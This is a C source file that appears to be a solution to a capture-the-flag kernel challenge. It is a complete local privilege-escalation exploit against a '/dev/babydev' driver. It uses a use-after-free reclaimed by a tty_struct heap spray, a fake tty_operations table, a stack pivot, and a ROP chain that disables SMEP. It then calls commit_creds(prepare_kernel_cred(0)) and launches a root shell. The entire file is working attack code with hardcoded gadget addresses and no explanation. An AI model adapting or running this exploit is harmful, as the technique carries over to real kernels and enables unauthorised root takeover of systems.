#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <string.h>
#include <linux/tty.h>
#include <sys/ioctl.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#define IOCTL_CMD 0x10001
#define TTY_STRUCT_SIZE 0x2e0
#define SPRAY_TIMES 0x100

struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,struct inode *inode, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,struct serial_icounter_struct *icount);
	const struct file_operations *proc_fops;
};

typedef int __attribute__((regparm(3)))(* commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(* prepare_kernel_cred_func)(unsigned long cred);

commit_creds_func commit_creds = (commit_creds_func) 0xffffffff810a1420;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0xffffffff810a1810;

unsigned long poprdiret = 0xffffffff810d238d;
unsigned long xchgeaxespret = 0xffffffff810587aa;
unsigned long movcr4rdi_poprbp_ret = 0xffffffff81004d80;
unsigned long swapgs_poprbp_ret = 0xffffffff81063694;
unsigned long iretqret = 0xffffffff814e35ef;

int spray_fd[SPRAY_TIMES];
unsigned long user_ss,user_cs,user_rflags;
void save_state(){
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"pushfq\n"
		"popq %2\n"
		: "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
		:
		: "memory");
}
void get_shell(){
	puts("[+] Root shell!!");
	char *filename="/bin/sh";
	char *argv[]={filename,NULL};
	execve(filename,argv,NULL);
} 

void shellcode(){
	commit_creds(prepare_kernel_cred(0));
}

void exploit(){
	save_state();
	struct tty_operations *fake_tty_operations =(struct tty_operations *)malloc(sizeof(struct tty_operations));
	memset(fake_tty_operations,0,sizeof(struct tty_operations));
	fake_tty_operations->ioctl=xchgeaxespret;
	fake_tty_operations->proc_fops=(char *)calloc(0x1000,1);
	char *buf=(char *)malloc(0x100);
	int fd1=open("/dev/babydev",O_RDWR);
	int fd2=open("/dev/babydev",O_RDWR);
	ioctl(fd1,IOCTL_CMD,TTY_STRUCT_SIZE);
	close(fd1);
	for(int i=0;i<SPRAY_TIMES;i++){
		spray_fd[i]=open("/dev/ptmx",O_RDWR|O_NOCTTY);
	}
	read(fd2,buf,32);
	unsigned long *target=(unsigned long *)&buf[24];
	*target=(unsigned long)fake_tty_operations;
	unsigned long *lower_address=(unsigned long *)(xchgeaxespret & 0xffffffff);	
	printf("[+] pivot_address = %p.\n",lower_address);
	unsigned long *base=(unsigned long *)((unsigned long)lower_address & ~0xfff);
	mmap((void *)base,0x30000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
	unsigned long rop_chain[]={poprdiret,0x6f0,movcr4rdi_poprbp_ret,0,shellcode,swapgs_poprbp_ret,0,iretqret,get_shell,user_cs,user_rflags,
					base+0x100,user_ss};
	memcpy(lower_address,rop_chain,sizeof(rop_chain));
	write(fd2,buf,32);
	for(int i=0;i<SPRAY_TIMES;i++){
		ioctl(spray_fd[i],0,0);
	}
}
int main(){
	exploit();
	return 0;
}
